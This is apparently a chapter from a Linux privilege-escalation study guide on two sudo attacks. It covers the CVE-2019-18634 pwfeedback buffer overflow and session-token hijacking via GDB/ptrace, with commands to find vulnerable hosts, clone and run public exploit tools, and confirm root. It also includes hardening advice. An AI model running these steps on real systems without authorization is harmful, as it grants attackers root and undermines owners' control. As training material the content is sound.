# 18 — Sudo Token / TTY Hijacking

## Overview

This file covers two **distinct** sudo-related techniques that don't involve a `sudo -l` misconfiguration at all — they abuse how sudo caches authentication and how it parses password input:

1. **CVE-2019-18634** — a buffer overflow in sudo's `pwfeedback` option (the asterisk-feedback-while-typing feature)
2. **Sudo token/TTY hijacking** — abusing sudo's authentication cache timeout via a process injection technique (GDB-based), when you have access to another user's active sudo session

Neither requires a NOPASSWD entry or a specific binary rule — they're structural weaknesses in how sudo authentication is implemented and cached.

---

## Part A: CVE-2019-18634 (pwfeedback Buffer Overflow)

### What is pwfeedback?

By default, sudo shows nothing while you type your password. Some admins enable `pwfeedback` so an asterisk (`*`) appears per character typed — a usability feature borrowed from other systems.

```
Defaults pwfeedback      ← this line in /etc/sudoers (or sudoers.d/) enables the feature
```

### The Vulnerability

Versions of sudo between 1.7.1 and 1.8.30 (inclusive) have a stack-based buffer overflow in the `pwfeedback` code path — pasting a very long string (not typing, pasting — this matters because buffer checks differ for bulk input) at the password prompt can overflow the buffer and lead to code execution, **without needing to know the actual password, and without requiring sudo permissions for any command**.

### Step 1 — Check if pwfeedback Is Enabled

```bash
sudo -l
```
**Breakdown:**
- Look for `pwfeedback` in the `Matching Defaults entries` section of the output
- You don't need any actual sudo RULES to be vulnerable — just the `pwfeedback` option being set is enough, since the overflow happens during the password PROMPT itself, before any authorization check

### Step 2 — Check Sudo Version

```bash
sudo -V | head -1
```
**Breakdown:**
- `sudo -V` = version info
- Vulnerable range: 1.7.1 – 1.8.30
- Patched: 1.8.31+ (and all 1.9.x)

### Step 3 — Obtain and Run the PoC

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
# transfer to target, compile per the repo's instructions
```

The PoC works by pasting a carefully-crafted long input at the password prompt via a scripted pseudo-terminal interaction — it does not require you to know the real password, since the crash happens during input buffering, before credentials are even checked.

```bash
./poc
id
```

**Note:** This exploit is version- and build-specific (behavior can vary with compiler hardening flags like stack canaries on different distro builds) — treat PoC success/failure as informative either way during enumeration.

---

## Part B: Sudo Token / TTY Hijacking (GDB Technique)

### Background — How Sudo Caches Authentication

After you successfully authenticate with `sudo`, it doesn't ask for your password again for a short window (default 15 minutes) — it caches a "token" tied to your session. This token is stored per-TTY (per terminal session) in `/var/run/sudo/ts/` (or similar, path varies by distro).

```bash
ls -la /var/run/sudo/ts/
```
**Breakdown:**
- Each file here corresponds to a user's cached sudo timestamp
- If you have write/read access that you shouldn't (misconfigured permissions, or you're root already and investigating lateral privilege options), this directory reveals who has an active cached sudo session

### The Technique (Requires an Existing Foothold)

This technique is relevant when you already have **some** elevated access (e.g., you're a different user but can `ptrace` another user's process — typically needs matching UID or `cap_sys_ptrace`/root already) and want to hijack an **active** sudo-authenticated session rather than compromise credentials directly.

```bash
# Find processes belonging to a target user with an active sudo session
ps aux | grep <targetuser>
```

```bash
gdb -p <PID_of_targets_shell>
```

Inside GDB, the general approach (exact commands depend on sudo/glibc version) is to locate and manipulate the process's memory to reset or extend the sudo timestamp validity, or to inject a call that spawns a privileged shell directly — this is an advanced, version-specific technique most practically executed via existing published tooling rather than manual GDB commands:

```bash
git clone https://github.com/nongiach/sudo_inject.git
cd sudo_inject
./activate_sudo_token.sh -u <targetuser>
```
**Breakdown:**
- This tooling automates locating the target's sudo token structures in memory and activating/injecting a valid token for your own session, effectively borrowing their cached authentication without needing their password
- Practical requirement: you need `ptrace` capability over the target process — this usually means same UID, root, or `cap_sys_ptrace` present (cross-reference with `07-capabilities.md`)

### Simpler Variant — Environment/TTY Reuse

If you land in a shell that **inherited** an already-sudo-authenticated TTY (e.g., a leftover screen/tmux session, or a shell spawned from a script that ran under an authenticated sudo session), you may simply be able to run `sudo` with no password prompt at all because the cached timestamp is still valid for that TTY:

```bash
sudo -n true && echo "Valid cached token - sudo works without password"
```
**Breakdown:**
- `sudo -n` = non-interactive, fails instead of prompting if no valid cached token exists
- `true` = a no-op command, just used to test authentication state
- If this succeeds silently, you have an active cached token available without any exploit needed — just inherited session reuse

---

## Why These Work (Conceptually)

- **pwfeedback overflow:** a classic memory-safety bug — bounds checking was missing on the feedback-character buffer specifically, a code path that's otherwise rarely exercised (most installs don't enable `pwfeedback`)
- **Token/TTY hijacking:** sudo's caching mechanism trusts the combination of UID + TTY + timestamp — if an attacker can access or manipulate the memory/files backing that cache (via ptrace or discovered misconfigurations), the trust boundary breaks down without ever touching the actual password

---

## Detection / Hardening Notes (Blue Team)

```bash
# Disable pwfeedback unless explicitly required
# Remove or comment out in /etc/sudoers / /etc/sudoers.d/*:
# Defaults pwfeedback

# Keep sudo updated - this specific CVE is long patched in current releases
sudo -V | head -1

# Restrict ptrace scope system-wide (limits token-hijacking style techniques generally)
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = unrestricted (any process can ptrace any other of same UID) - least secure
# 1 = restricted (default on most modern distros) - a process can only ptrace its own children
echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

---

## Practice

CVE-2019-18634 is a quick, low-effort check worth running on any box where `pwfeedback` shows up in `sudo -l` output — it costs nothing to test. Token/TTY hijacking is more advanced and situational, typically relevant on CTF boxes specifically designed around multi-user lateral movement scenarios rather than a first point of entry.

---

## Quick Checklist

```
[ ] sudo -l                                          → check for 'pwfeedback' in Defaults
[ ] sudo -V | head -1                                → check sudo version (1.7.1-1.8.30 vulnerable)
[ ] clone/compile CVE-2019-18634 PoC                 → run against password prompt
[ ] id                                                → confirm root if successful
[ ] ls -la /var/run/sudo/ts/                         → enumerate cached sudo tokens
[ ] ps aux | grep <targetuser>                       → find target's active session
[ ] cat /proc/sys/kernel/yama/ptrace_scope           → check if ptrace is restricted
[ ] use sudo_inject or similar tooling (requires ptrace access to target)
[ ] sudo -n true                                     → test for inherited valid cached token
```
